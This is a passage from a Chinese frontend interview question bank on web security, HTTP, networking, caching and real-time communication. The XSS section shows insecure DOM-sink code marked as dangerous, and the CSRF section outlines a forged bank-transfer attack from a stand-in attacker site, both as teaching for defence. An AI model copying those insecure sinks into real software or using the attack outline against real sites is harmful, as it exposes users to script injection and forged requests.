**存储型 XSS**：恶意内容写入数据库，其他用户浏览时触发，例如评论、昵称、富文本。

**反射型 XSS**：恶意参数被服务端拼回 HTML，诱导用户点击链接后触发。

**DOM 型 XSS**：前端把 URL、postMessage、localStorage 等不可信数据写进危险 DOM sink。

### 防御核心
1. **上下文相关输出编码**
   ```js
   el.textContent = userInput; // 文本上下文首选
   ```
   HTML 文本、HTML 属性、URL、CSS、JS 字符串的转义规则不同，不能用一个简单 replace 解决所有场景。React/Vue 的模板插值默认会转义文本，但 `dangerouslySetInnerHTML`、`v-html`、手写 DOM 仍有风险。

2. **避免危险 sink**
   ```js
   // 危险
   el.innerHTML = location.hash;
   document.write(userInput);
   element.setAttribute('href', userUrl); // 需校验 javascript: 等协议

   // 更安全
   el.textContent = userInput;
   ```

3. **富文本白名单清洗**
   ```js
   import DOMPurify from 'dompurify';

   preview.innerHTML = DOMPurify.sanitize(markdownHtml);
   ```
   富文本不能只靠转义，否则功能不可用；应使用成熟 sanitizer，并限制标签、属性、协议。

4. **CSP 防御纵深**
   ```http
   Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random'; object-src 'none'; base-uri 'self'
   ```
   CSP 可以降低 XSS 成功后的执行面。先用 `Content-Security-Policy-Report-Only` 收集问题，再切到强制模式。

5. **Cookie 和敏感数据保护**
   ```http
   Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Lax
   ```
   `HttpOnly` 能防止脚本直接读 Cookie，但 XSS 仍可在用户会话内发请求，所以它不是 XSS 的根本防御。

6. **Trusted Types**
   在支持的浏览器中，Trusted Types 可以强制 `innerHTML` 等危险 sink 只能接收经过策略创建的可信值，适合大型前端治理 DOM XSS。

<!-- id: net-045; difficulty: 2; tags: CSRF, 安全, Cookie; source: 高频 -->
# 什么是 CSRF 攻击？如何防御？

## CSRF（跨站请求伪造）

CSRF 利用浏览器会自动携带目标站点 Cookie 的特性，让用户在登录状态下向目标站点发起非本人意图的请求。

### 攻击原理
```
1. 用户已登录 bank.example，浏览器保存 session Cookie
2. 用户访问 evil.example
3. 恶意页面自动提交表单到 bank.example/transfer
4. 浏览器带上 bank.example 的 Cookie
5. 如果服务端只认 Cookie，就可能误认为是用户本人操作
```

前提通常是服务端用 Cookie 作为身份凭证，并且敏感接口缺少额外的用户意图校验。

### 防御措施
1. **SameSite Cookie**
   ```http
   Set-Cookie: session=xxx; Secure; HttpOnly; SameSite=Lax
   Set-Cookie: session=xxx; Secure; HttpOnly; SameSite=Strict
   Set-Cookie: thirdparty=xxx; Secure; SameSite=None
   ```
   `Lax` 适合多数站点，允许部分顶级安全导航但限制跨站子请求和表单 POST；`Strict` 更强但可能影响外部链接登录态；`None` 必须配合 `Secure`。

2. **CSRF Token**
   ```html
   <meta name="csrf-token" content="server-generated-random-token">
   ```
   ```js
   fetch('/api/transfer', {
     method: 'POST',
     headers: { 'X-CSRF-Token': document.querySelector('meta[name="csrf-token"]').content },
     body: JSON.stringify(payload),
   });
   ```
   token 应随机、不可预测、与用户会话绑定，并在服务端验证。

3. **Origin / Referer 校验**
   ```js
   const value = req.headers.origin ?? req.headers.referer;
   const requestOrigin = value ? new URL(value).origin : null;

   if (requestOrigin !== 'https://bank.example') {
     return res.status(403).json({ error: 'CSRF detected' });
   }
   ```
   不要用 `startsWith('https://bank.example')`，否则 `https://bank.example.evil.com` 会绕过。部分请求可能没有 Origin/Referer，策略要明确是拒绝还是降级校验。

4. **双重提交 Cookie**
   Cookie 中放 CSRF token，请求头或表单字段也带同一 token，服务端比较两者。更稳妥的做法是使用签名 token，防止子域或注入点覆盖 Cookie。

5. **接口语义和二次确认**
   - GET 必须保持安全，不做转账、删除等副作用操作
   - 高危操作加重新认证、短信/邮箱/二次确认
   - JSON API 不要只靠 `Content-Type` 防御，因为预检不是安全边界

### CSRF vs XSS
XSS 是在目标站点执行攻击者脚本；CSRF 是跨站借用用户 Cookie 发请求。XSS 往往能绕过 CSRF token，所以两类防御都要做。

<!-- id: net-046; difficulty: 1; tags: DNS, CDN, 域名解析; source: 高频 -->
# DNS 解析过程是什么？CDN 的工作原理是什么？

## DNS 解析过程与 CDN

### DNS 解析流程
```
浏览器/应用缓存
  ↓ 未命中
操作系统缓存、hosts
  ↓ 未命中
递归解析器（运营商、企业 DNS、公共 DNS、DoH/DoT 提供方）
  ↓ 递归解析器代替客户端迭代查询
根 DNS → TLD DNS（如 .com）→ 权威 DNS
  ↓
返回 A/AAAA/CNAME 等记录，并按 TTL 缓存
```

浏览器一般不会自己逐级查询根、TLD、权威 DNS，而是把问题交给递归解析器。`TTL` 越短切流越灵活，但解析负载更高；`TTL` 越长缓存命中更好，但变更生效更慢。

### 常见 DNS 记录
```
A       域名到 IPv4
AAAA    域名到 IPv6
CNAME   别名，常用于接入 CDN
NS      域名的权威 DNS
MX      邮件服务器
TXT     SPF、DKIM、域名验证等文本记录
CAA     限制哪些 CA 可以签发证书
SRV     服务发现，包含端口和优先级
```

### CDN 如何工作
```
用户访问 static.example.com
  ↓ DNS CNAME 到 CDN 域名，或由 CDN 托管权威 DNS
CDN 调度返回边缘节点 IP（也可能结合 Anycast/BGP）
  ↓
用户连接边缘节点
  ├─ 缓存命中：边缘直接返回
  └─ 缓存未命中：回源获取 → 写入缓存 → 返回用户
```

“最近节点”通常不是纯地理最近，而是综合解析器位置、EDNS Client Subnet、运营商链路、节点负载、健康状态和路由结果。

### CDN 收益与边界
- 降低用户到内容的网络 RTT，提升静态资源和可缓存 API 的访问速度
- 降低源站带宽、连接数和峰值压力
- 配合 Origin Shield、WAF、DDoS 防护、图片处理等厂商能力提升稳定性
- DDoS 防护不是所有 CDN 自动具备，要看套餐和配置

### 前端优化
```html
<link rel="dns-prefetch" href="//cdn.example.com">
<link rel="preconnect" href="https://cdn.example.com" crossorigin>
```

`dns-prefetch` 只提前解析 DNS；`preconnect` 会提前做 DNS、TCP、TLS，成本更高，应只用于关键域名。

<!-- id: net-047; difficulty: 2; tags: WebSocket, SSE, 长轮询, 实时通信; source: 高频 -->
# WebSocket、SSE、长轮询的区别是什么？各自适用什么场景？

## WebSocket、SSE、长轮询对比

### 短轮询
```js
setInterval(async () => {
  const res = await fetch('/api/messages?since=' + lastId);
  render(await res.json());
}, 3000);
```

实现简单，但大量请求可能没有新数据，实时性取决于间隔，适合低频、低成本场景。

### 长轮询
```js
async function longPoll() {
  try {
    const res = await fetch('/api/wait', { signal: AbortSignal.timeout(30000) });
    render(await res.json());
  } catch (e) {
    await new Promise((r) => setTimeout(r, 1000));
  } finally {
    longPoll();
  }
}
```

服务端 hold 住请求，有数据、超时或连接关闭时返回，客户端马上发起下一次。兼容性好，但服务端要管理挂起请求、超时、断开清理和重试退避。

### SSE（Server-Sent Events）
```js
const es = new EventSource('/api/stream');
es.onmessage = (e) => render(JSON.parse(e.data));
es.addEventListener('done', () => es.close());
```

```http
Content-Type: text/event-stream
Cache-Control: no-cache
X-Accel-Buffering: no
```

```
id: 42
event: message
data: {"text":"hello"}

```

SSE 是服务端到客户端的单向文本流，基于普通 HTTP，可自动重连并携带 `Last-Event-ID`。限制是浏览器 `EventSource` 只能 GET，不能自定义请求头，传二进制不方便；HTTP/1.1 下还要注意每域连接数限制和代理缓冲。

### WebSocket
```js
const ws = new WebSocket('wss://example.com/ws');
ws.onopen = () => ws.send(JSON.stringify({ type: 'subscribe', roomId }));
ws.onmessage = (e) => render(JSON.parse(e.data));
ws.onclose = () => reconnectWithBackoff();
```

WebSocket 通过 HTTP Upgrade 建连，之后是双向全双工消息通道，支持文本和二进制。浏览器不暴露协议层 ping/pong，业务层心跳通常用应用消息实现。

### 选择建议
```
方式        方向        优点                    适用场景
短轮询      客户端拉取   最简单                  后台状态、低频通知
长轮询      客户端拉取   兼容 HTTP，延迟较低      老环境、消息通知
SSE         服务端推送   简单、自动重连、流式文本  通知、日志、AI 输出、行情展示
WebSocket   双向通信     低延迟、全双工、二进制    聊天、协同编辑、游戏、实时控制
```

鉴权上，WebSocket/SSE 都要考虑 token 过期、重连恢复、消息顺序、心跳和服务端限流。

<!-- id: net-048; difficulty: 2; tags: HTTP, Cookie, Session, Token, JWT; source: 高频 -->
# Cookie、Session、Token、JWT 的区别和使用场景？

## Cookie、Session、Token、JWT

### Cookie
Cookie 是浏览器保存并自动随匹配域名请求发送的小型键值数据，是传输机制，不等同于登录状态。

```http
Set-Cookie: sid=abc; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
```

- `HttpOnly`：JS 不能读取，降低 XSS 窃取风险
- `Secure`：只在 HTTPS 发送
- `SameSite`：降低 CSRF 风险
- Cookie 自动携带，适合 Web 登录，但跨站和 CSRF 要特别处理

### Session
```
1. 用户登录，服务端创建 session 数据，存 Redis/数据库/内存
2. 浏览器保存 sessionId Cookie
3. 后续请求自动带 sessionId
4. 服务端查 session 验证用户身份和权限
```

优点是可主动撤销、服务端可控；缺点是服务端有状态，分布式需要共享存储和过期清理。

### Token
Token 通常是凭证的统称，可以是随机字符串，也可以是结构化令牌。随机 token 需要服务端查库或查缓存验证，撤销简单但每次验证要访问状态存储。

### JWT
```
Header.Payload.Signature
```

JWT 的 payload 只是 Base64URL 编码，默认不加密，任何拿到 token 的人都能解码；安全性来自签名验证，而不是内容保密。

服务端验证时要检查：
- 签名和允许的算法，不能信任 token 自带的 `alg`
- `exp`、`nbf`、`iat`、`iss`、`aud`、`sub`
- 密钥轮换和 `kid` 查找逻辑是否安全

### 存储方案权衡
```
存 localStorage：请求头携带方便，但 XSS 可读取 token
存内存：XSS 读取难度增加，刷新页面丢失，需要刷新机制
存 HttpOnly Cookie：JS 不能读取，但要防 CSRF
```

常见实践是短期 access token + refresh token rotation。refresh token 泄露后要能检测复用、撤销会话并重新登录。

### 使用场景
- 传统 Web：Cookie + Session 简洁可靠，适合后台、管理系统、同站应用
- 多端 API：Bearer token 便于移动端、服务端调用和跨域 API
- JWT：适合短期访问令牌、微服务网关传递已验证身份，但不要把大权限或敏感信息长期塞进 JWT

结论：Cookie、Session、Token、JWT 是不同层面的概念。Cookie 是浏览器传输载体，Session 是服务端状态，Token 是凭证，JWT 是一种自包含签名 token 格式。

<!-- id: net-049; difficulty: 3; tags: TCP, UDP, 对比; source: 高频 -->
# TCP 和 UDP 的区别是什么？什么场景下使用 UDP？

## TCP vs UDP

### 核心区别
```
特性        TCP                         UDP
连接        面向连接，三次握手            无连接，直接发 datagram
可靠性      协议内置确认、重传、去重       协议本身不保证送达
顺序        字节流有序交付                每个报文独立，可能乱序
边界        字节流，无消息边界            保留消息边界
流量控制    有接收窗口                    无内置流量控制
拥塞控制    有内置拥塞控制                UDP 本身没有，应用协议应自行实现
头部        20 字节起                     8 字节
多播/广播   不支持                       IPv4 局域网广播、多播场景可用
```

不要简单说 TCP 慢、UDP 快。TCP 的握手、可靠性和队头阻塞会带来开销；UDP 更轻，但如果应用层要可靠、有序、拥塞控制，也要自己付出成本。

### TCP 适用场景
- Web 页面和传统 HTTP/1.1、HTTP/2
- 文件传输、邮件、SSH、数据库连接
- 对完整性、有序性要求高，且可以接受重传带来的延迟

### UDP 适用场景
- DNS：短请求短响应，失败可快速重试；大响应也可能回退 TCP
- WebRTC 音视频：宁可丢帧，也不能无限等待旧包
- 在线游戏：低延迟优先，状态可用新帧覆盖旧帧
- 直播、监控、语音等实时传输
- HTTP/3/QUIC：在 UDP 之上实现连接、可靠传输、拥塞控制和加密

### QUIC 为什么基于 UDP
1. 可以在用户态快速迭代协议，不受内核 TCP 栈升级限制
2. 多 stream 独立传输，减少 TCP 字节流队头阻塞影响
3. TLS 1.3 集成在握手中，支持更快连接建立和连接迁移
4. 自己实现拥塞控制、丢包恢复、流量控制和可靠交付

结论：TCP 把可靠有序传输做进协议；UDP 提供最小传输能力，把可靠性和实时性取舍交给上层协议。

<!-- id: net-050; difficulty: 2; tags: 首屏性能, 网络瀑布图, 性能排查; source: 高频 -->
# 从输入 URL 到首屏显示，如果页面很慢，你会如何分阶段定位瓶颈？

## URL 到首屏的分阶段排查

### 核心结论
不要只说“DNS、TCP、渲染流程”。排查慢页面时要把链路拆成导航、网络、服务端、资源加载、渲染和主线程执行几个阶段，并用指标定位瓶颈。

### 1. 导航与连接阶段
- 看 DNS、TCP、TLS 或 QUIC 握手耗时。
- 优化手段包括 DNS 预解析、preconnect、连接复用、CDN 边缘节点和 HTTP/2/HTTP/3。
- 如果跨地域 TTFB 高，优先看 CDN、边缘缓存和服务端部署位置。

### 2. 服务端响应阶段
- 重点看 TTFB。
- 慢的原因可能是 SSR 数据等待、数据库查询、接口串行、缓存未命中或冷启动。
- 优化手段包括页面缓存、流式 SSR、接口并行、边缘渲染和后端缓存。

### 3. 关键资源发现阶段
- 看 HTML 中是否过晚发现首屏 CSS、字体、主图和关键 JS。
- 对 LCP 图片、关键字体、关键 CSS 使用 `preload` 或 `fetchpriority`。
- 第三方脚本应延迟、异步或隔离加载。

### 4. 下载与缓存阶段
- 看 JS/CSS/图片体积、压缩、缓存命中率和 CDN 命中率。
- 带 hash 的静态资源长期缓存，HTML 使用协商缓存。
- 图片优先使用合适尺寸、AVIF/WebP、响应式 `srcset`。

### 5. 渲染与主线程阶段
- 看 FCP、LCP、Long Task、INP 和 hydration 时间。
- 大包执行、复杂 hydration、同步计算、长列表渲染都会拖慢首屏。
- 优化手段包括代码分割、按需 hydration、虚拟列表、Web Worker 和任务分片。

### 6. 证据工具
- Chrome DevTools Performance/Network：看瀑布图、主线程和 LCP 元素。
- Lighthouse/WebPageTest：看实验室环境瓶颈。
- RUM：看真实用户的地域、设备、网络和浏览器差异。

### 面试表达
先用指标确定慢在哪一段，再选择优化手段：连接慢看网络与 CDN，TTFB 慢看服务端，LCP 慢看关键资源，INP 差看主线程和交互任务。

<!-- id: net-051; difficulty: 2; tags: HTTP, 请求方法, RESTful; source: 高频 -->
# HTTP 请求方法有哪些？GET 和 POST 的区别是什么？

## HTTP 请求方法

### 常见方法
```
GET      获取资源，安全且幂等
HEAD     只获取响应头，安全且幂等
POST     提交数据、创建资源或触发处理，不天然幂等
PUT      整体替换资源，幂等
PATCH    部分修改资源，不天然幂等，可按业务设计为幂等
DELETE   删除资源，目标状态幂等；重复删除可能返回 204 或 404
OPTIONS  查询通信选项，CORS 预检会用到
```

安全方法指“不应该产生用户可感知的副作用”，不是指 HTTPS 安全。

### GET vs POST
```
维度        GET                              POST
语义        读取资源                          提交实体或触发处理
参数位置    通常放 URL 查询字符串              通常放请求体
缓存        默认更容易被缓存，可显式控制        默认不缓存，但可通过头部显式缓存
幂等        按规范应幂等                      不天然幂等
可分享      URL 可复制、收藏、进入历史记录       请求体不体现在 URL 中
大小限制    受浏览器、服务器、代理 URL 限制      受 body、服务器和网关限制
```

不要说 POST 比 GET 更安全。只要不是 HTTPS，请求体也可能被中间人看到；即使是 HTTPS，GET 参数也更容易出现在日志、Referer、浏览器历史和监控系统中，所以敏感信息不要放 URL。

### GET 请求体
规范没有完全禁止 GET 带 body，但语义不清，很多缓存、代理、框架和服务端不会按预期处理。实际工程中不要依赖 GET body 传参。

### 幂等性和重试
- GET/HEAD/PUT/DELETE 语义上幂等，更适合自动重试
- POST/PATCH 如果要重试，应使用业务幂等键，例如 `Idempotency-Key`
- 幂等不等于每次响应完全相同，例如第一次 DELETE 返回 204，第二次可能返回 404，但资源最终状态相同

### RESTful 示例
```
GET    /articles?status=draft&limit=20  查询列表
POST   /articles                        创建文章，成功返回 201 + Location
GET    /articles/1                      查询文章
PUT    /articles/1                      整体替换
PATCH  /articles/1                      部分修改
DELETE /articles/1                      删除，成功可返回 204
```

<!-- id: net-052; difficulty: 3; tags: 网络安全, CSP, HSTS, 点击劫持; source: 高频 -->
# 前端常见安全攻击还有哪些？CSP、HSTS、点击劫持如何防御？

## 前端安全防御体系

### CSP（Content Security Policy）
CSP 通过白名单限制脚本、样式、图片、连接、表单和 iframe 来源，是 XSS 和数据外传的防御纵深。

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-random' 'strict-dynamic';
  object-src 'none';
  base-uri 'self';
  connect-src 'self' https://api.example.com;
  img-src 'self' data: https:;
  frame-ancestors 'none';
  form-action 'self';
  upgrade-insecure-requests
```

上线前先用 `Content-Security-Policy-Report-Only` 收集违规，逐步收紧。不要为了省事加 `unsafe-inline` 或过宽的 `*`。

### HSTS
```http
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

HSTS 让浏览器在有效期内强制使用 HTTPS，防 SSL Stripping。`preload` 可以保护首次访问，但要求全站和子域 HTTPS 覆盖完整，撤回很慢，应谨慎启用。

### 点击劫持
```http
Content-Security-Policy: frame-ancestors 'none'
X-Frame-Options: DENY
```

`frame-ancestors` 是现代首选；`X-Frame-Options` 用于兼容旧浏览器。合法嵌入要精确列出允许的父页面来源，不要放开任意来源。

### 其他常见攻击与防御
- **XSS**：上下文输出编码、避免 `innerHTML`、富文本用 DOMPurify、CSP、HttpOnly Cookie
- **CSRF**：SameSite Cookie、CSRF token、Origin/Referer 校验、敏感操作二次确认
- **开放重定向**：跳转 URL 用白名单或只允许相对路径
- **供应链/CDN 篡改**：使用 lockfile、依赖审计、SRI、固定版本
- **信息泄露**：错误信息不暴露堆栈、token 不写 URL、日志脱敏
- **SQL 注入**：主要在后端防御，必须参数化查询；前端校验只能改善体验

### 安全响应头
```http
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-site
```

`X-XSS-Protection` 是旧浏览器遗留机制，现代项目一般不再依赖，可显式关闭或不配置，核心仍是编码、CSP 和安全 DOM API。

<!-- id: net-053; difficulty: 2; tags: HTTP, 连接, keep-alive, 连接池; source: 高频 -->
# HTTP 长连接（keep-alive）是什么？HTTP/1.1 和 HTTP/2 连接复用有什么不同？

## HTTP 长连接和连接复用

### HTTP/1.1 Keep-Alive
HTTP/1.0 默认短连接；HTTP/1.1 默认持久连接，除非发送 `Connection: close`。

```http
Connection: keep-alive
Keep-Alive: timeout=60, max=100
```

`Connection`、`Keep-Alive` 是 HTTP/1.x 的逐跳连接管理头，HTTP/2/3 中不能使用。

### HTTP/1.1 的复用方式
```
conn1: req1 → res1 → req2 → res2
conn2: req3 → res3
```

HTTP/1.1 常规模式在单连接上基本是一问一答。Pipelining 可以连续发多个请求，但响应必须按顺序返回，队头阻塞明显，浏览器实践中很少启用。因此浏览器通常对同源开多个 TCP 连接并发请求，也产生了早期 domain sharding 技巧。

### HTTP/2 多路复用
```
单个 TCP 连接
  stream1: HEADERS/DATA ...
  stream3:   HEADERS/DATA ...
  stream5:     HEADERS/DATA ...
```

HTTP/2 把消息拆成帧，多个 stream 交错发送。它解决了 HTTP 应用层队头阻塞，并减少连接数量，但仍受 TCP 丢包导致的传输层队头阻塞影响。HTTP/3/QUIC 用独立 stream 缓解这一点。

### 实践差异
- HTTP/1.1：小资源过多时连接排队明显，过去会合并文件和域名分片
- HTTP/2：域名分片可能适得其反，因为会破坏连接复用和头部压缩
- HTTP/2 不意味着资源越碎越好，仍要按路由、缓存生命周期和关键路径拆包
- 长连接超时时间要和浏览器、CDN、负载均衡器、上游服务一起调

### Node.js 连接池
```js
import https from 'node:https';

const agent = new https.Agent({
  keepAlive: true,
  maxSockets: 50,
  maxFreeSockets: 10,
});

https.get('https://api.example.com', { agent }, (res) => res.resume());
```

Node 18+ 的全局 `fetch` 基于 Undici，传统 `http.Agent` 不通过 `{ agent }` 直接生效；要配置连接池应使用 Undici dispatcher/Agent。

<!-- id: net-054; difficulty: 2; tags: 浏览器缓存, Service Worker, PWA; source: 高频 -->
# Service Worker 是什么？如何用它实现离线缓存？

## Service Worker 与离线缓存

Service Worker 是运行在页面之外的事件驱动 Worker，可以拦截同一 scope 下的网络请求，用于离线缓存、PWA、推送通知和后台同步。

### 特点
- 需要 HTTPS 或 localhost
- 独立于页面主线程，不能直接操作 DOM
- 不是常驻进程，浏览器会按事件启动和终止
- 作用范围由脚本 URL 和注册 scope 决定，例如 `/sw.js` 默认控制整个站点

### 注册
```js
if ('serviceWorker' in navigator) {
  window.addEventListener('load', async () => {
    const reg = await navigator.serviceWorker.register('/sw.js');
    console.log('scope:', reg.scope);
  });
}
```

### 生命周期
```
install → waiting → activate → fetch/message/push/sync
```

新 SW 默认会等旧页面关闭后再接管。`skipWaiting()` 和 `clients.claim()` 能立即接管，但可能让旧页面搭配新缓存运行，真实项目要设计版本兼容和刷新提示。

### 离线缓存示例
```js
const CACHE_NAME = 'app-v1';
const PRECACHE = ['/', '/index.html', '/offline.html'];

self.addEventListener('install', (event) => {
  event.waitUntil(caches.open(CACHE_NAME).then((cache) => cache.addAll(PRECACHE)));
});

self.addEventListener('activate', (event) => {
  event.waitUntil(
    caches.keys().then((keys) =>
      Promise.all(keys.filter((key) => key !== CACHE_NAME).map((key) => caches.delete(key))),
    ),
  );
});

self.addEventListener('fetch', (event) => {
  const { request } = event;
  if (request.method !== 'GET') return;

  if (request.mode === 'navigate') {
    event.respondWith(
      fetch(request).catch(() => caches.match('/offline.html')),
    );
    return;
  }

  event.respondWith(cacheFirst(request));
});

async function cacheFirst(request) {
  const cached = await caches.match(request);
  if (cached) return cached;

  const response = await fetch(request);
  if (response.ok && response.type === 'basic') {
    const cache = await caches.open(CACHE_NAME);
    cache.put(request, response.clone());
  }
  return response;
}
```

### 常见策略
- **Cache First**：静态资源、字体、版本化图片
- **Network First**：HTML、需要新鲜度的 API，失败时回退缓存
- **Stale While Revalidate**：先返回缓存，后台更新，下次生效
- **Network Only**：支付、鉴权、隐私数据等不应缓存的请求

### 注意事项
- 不要缓存非 GET、错误响应、带用户隐私的数据
- Cache Storage 不等于 HTTP cache，要自己做版本、清理和容量控制
- Vite/webpack 产物通常带 hash，生产可用 Workbox 生成 precache manifest
- DevTools Application 面板可查看 SW 状态、缓存和更新流程

<!-- id: net-055; difficulty: 3; tags: 网络性能, 优化, preload, prefetch; source: 高频 -->
# preload、prefetch、preconnect 的区别是什么？如何合理使用？

## preload、prefetch、preconnect

这些都是 Resource Hints，用来提前告诉浏览器“接下来可能需要什么”。用错会抢占带宽或制造无效请求。

### preload：当前页面马上要用
```html
<link rel="preload" href="/fonts/inter.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/hero.avif" as="image" fetchpriority="high">
<link rel="modulepreload" href="/assets/route-dashboard.js">
```

- 立即以较高优先级下载当前导航必需资源
- `as` 影响优先级、缓存匹配、CSP 和请求头
- preload 只下载，不会自动执行脚本或应用样式
- 字体 preload 要带 `crossorigin`，否则可能和真实字体请求不能复用
- 对未使用资源 preload，浏览器会警告且浪费带宽

### prefetch：未来页面可能用
```html
<link rel="prefetch" href="/assets/settings-route.js" as="script">
```

prefetch 优先级低，适合用户下一步可能访问的路由、数据或资源。它可能被浏览器根据网络、电量、用户设置或缓存压力跳过，不应依赖它保证业务正确性。

### preconnect：提前建连
```html
<link rel="preconnect" href="https://api.example.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
```

preconnect 会提前完成 DNS、TCP、TLS 或 QUIC 连接，但不下载资源。连接空闲会被关闭，所以只给关键且即将使用的少数域名加。

### dns-prefetch：只解析 DNS
```html
<link rel="dns-prefetch" href="//analytics.example.com">
```

比 preconnect 成本低，适合不确定是否马上使用的第三方域名。

### 使用建议
- LCP 首屏图：优先考虑 `fetchpriority="high"` 或 preload，避免和懒加载冲突
- 关键字体：preload + 正确 `type` + `crossorigin`
- ES Module 入口依赖：用 `modulepreload`
- 下一路由资源：基于 hover、viewport 或路由预测 prefetch
- 第三方 API/CDN：关键域名用 preconnect，非关键域名用 dns-prefetch

### 避免滥用
- 不要 preload 大量资源，容易挤占 HTML、CSS、LCP 图片等关键下载
- 不要 preconnect 太多第三方域名，会浪费 socket 和 TLS 状态
- 预加载资源的 URL、`as`、`crossorigin` 必须和真实请求一致，否则不能复用缓存

<!-- id: net-056; difficulty: 3; tags: HTTP, Range, 断点续传, 大文件; source: 高频 -->
# HTTP 如何实现大文件传输和断点续传？

## 大文件传输与断点续传

### Range 请求
```http
GET /file.zip HTTP/1.1
Range: bytes=0-1023       # 第 0 到 1023 字节
Range: bytes=1024-        # 从 1024 到结尾
Range: bytes=-1024        # 最后 1024 字节
```

```http
HTTP/1.1 206 Partial Content
Accept-Ranges: bytes
Content-Range: bytes 0-1023/104857600
Content-Length: 1024
ETag: "file-version"
```

如果服务器不支持范围请求，可能忽略 `Range` 并返回 `200 OK` 全量内容；范围非法会返回 `416 Range Not Satisfiable`。

### 断点续传关键点
- 用 `Content-Range` 获取当前片段范围和总大小
- 用 `ETag` 或 `Last-Modified` 标识文件版本，避免续传时文件已变化
- 继续下载时可带 `If-Range`，版本没变返回 206，变了则返回 200 全量
- 跨域下载时服务端要暴露 `Content-Length`、`Content-Range`、`Accept-Ranges`、`ETag`

```http
Access-Control-Expose-Headers: Content-Length, Content-Range, Accept-Ranges, ETag
```

### 下载示例
```js
async function fetchRange(url, start, end, etag) {
  const headers = { Range: `bytes=${start}-${end}` };
  if (etag) headers['If-Range'] = etag;

  const res = await fetch(url, { headers });
  if (res.status !== 206) {
    throw new Error(`Range not supported or file changed: ${res.status}`);
  }
  return res.arrayBuffer();
}
```

浏览器里把所有分片放进数组再 `new Blob(chunks)` 会占用大量内存。超大文件更适合用 File System Access API、Streams API 或交给浏览器原生下载能力处理。

### 分片上传
```js
async function uploadInChunks(file, uploadId, chunkSize = 5 * 1024 * 1024) {
  const total = Math.ceil(file.size / chunkSize);

  for (let index = 0; index < total; index++) {
    const chunk = file.slice(index * chunkSize, Math.min(file.size, (index + 1) * chunkSize));
    const form = new FormData();
    form.append('uploadId', uploadId);
    form.append('index', String(index));
    form.append('total', String(total));
    form.append('chunk', chunk);

    const res = await fetch('/upload/chunk', { method: 'POST', body: form });
    if (!res.ok) throw new Error(`chunk ${index} failed`);
  }

  await fetch('/upload/complete', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ uploadId, filename: file.name, size: file.size, total }),
  });
}
```

服务端要记录 uploadId、已上传分片、分片校验和、最终 hash、权限和过期清理。真实产品通常还会做并发上传、失败重试、暂停恢复、秒传和对象存储 multipart upload。

<!-- id: net-057; difficulty: 2; tags: 跨域, JSONP, 代理; source: 高频 -->
# 除了 CORS，还有哪些跨域解决方案？

## CORS 之外的跨域方案

浏览器同源策略限制的是页面脚本读取跨源响应；不同方案适合不同问题，不能都当作通用“绕过跨域”。

### 1. 反向代理
```nginx
server {
  listen 443 ssl;
  server_name app.example.com;

  location /api/ {
    proxy_pass https://api.internal.example.com/;
    proxy_set_header Host api.internal.example.com;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
  }
}
```

浏览器看到的是同源 `/api/*`，由网关转发到后端。生产环境常用于统一鉴权、Cookie 域、日志和限流。

### 2. 开发代理
```js
export default {
  server: {
    proxy: {
      '/api': {
        target: 'http://localhost:3000',
        changeOrigin: true,
        rewrite: (path) => path.replace(/^\/api/, ''),
      },
    },
  },
};
```

只解决本地开发体验，不代表线上安全策略。

### 3. JSONP
```html
<script src="https://api.example.com/list?callback=handle"></script>
```

利用 `<script>` 可跨源加载的特性，只支持 GET，返回的是可执行脚本。它没有标准错误处理，安全风险高，现代项目基本不用。

### 4. postMessage
```js
iframe.contentWindow.postMessage({ type: 'hello' }, 'https://child.example');

window.addEventListener('message', (event) => {
  if (event.origin !== 'https://parent.example') return;
  if (event.data?.type !== 'hello') return;
  event.source?.postMessage({ type: 'reply' }, event.origin);
});
```

适合 iframe、popup、worker 等跨窗口通信。必须指定精确 `targetOrigin`，接收时校验 `event.origin` 和消息结构。

### 5. WebSocket
```js
const ws = new WebSocket('wss://api.example.com/ws');
```

WebSocket 不走浏览器 CORS 机制，但握手请求会带 `Origin` 头。服务端必须校验 Origin、鉴权 token、子协议和限流，不能因为“没有 CORS”就默认安全。

### 6. 资源标签跨源加载
`<img>`、`<script>`、`<link>`、`<video>` 可以跨源加载资源，但脚本通常不能任意读取响应内容。需要读像素、字体或下载头时仍要 CORS 配合。

### 不推荐的新项目方案
- `document.domain`：历史方案，已不推荐
- `window.name`、location hash 中转：脆弱且难治理
- 关闭浏览器安全策略或用插件绕过：只能用于临时调试，不能作为解决方案

<!-- id: net-058; difficulty: 3; tags: HTTP, 性能, 连接优化; source: 高频 -->
# 什么是 HTTP 队头阻塞（Head-of-Line Blocking）？HTTP/2 和 HTTP/3 分别如何解决？

## HTTP 队头阻塞（Head-of-Line Blocking）

队头阻塞是队列前面的任务卡住，导致后面的任务即使已经准备好也不能继续。

### HTTP/1.1 队头阻塞
HTTP/1.1 单连接常规模式是一问一答：
```
req1 → res1 → req2 → res2 → req3 → res3
```

如果 `res1` 很慢，后续请求只能等待。HTTP/1.1 pipelining 虽然能连续发送请求，但响应仍必须按顺序返回，所以浏览器实践中很少使用。浏览器通常用多个 TCP 连接并发来缓解。

### HTTP/2 解决应用层 HOL
HTTP/2 把请求/响应拆成帧，在同一 TCP 连接上用多个 stream 交错传输：
```
S1 HEADERS → S3 HEADERS → S1 DATA → S5 HEADERS → S3 DATA
```

这样慢响应不会在 HTTP 层阻塞其他 stream，解决了 HTTP/1.1 的应用层队头阻塞。

### HTTP/2 仍有 TCP 层 HOL
TCP 提供有序字节流。如果某个 TCP segment 丢失，接收端即使收到了后续字节，也必须等待丢失部分重传后才能把有序字节交给 HTTP/2。因为所有 HTTP/2 stream 共享同一 TCP 连接，丢包会影响整条连接上的多个 stream。

### HTTP/3/QUIC 的改进
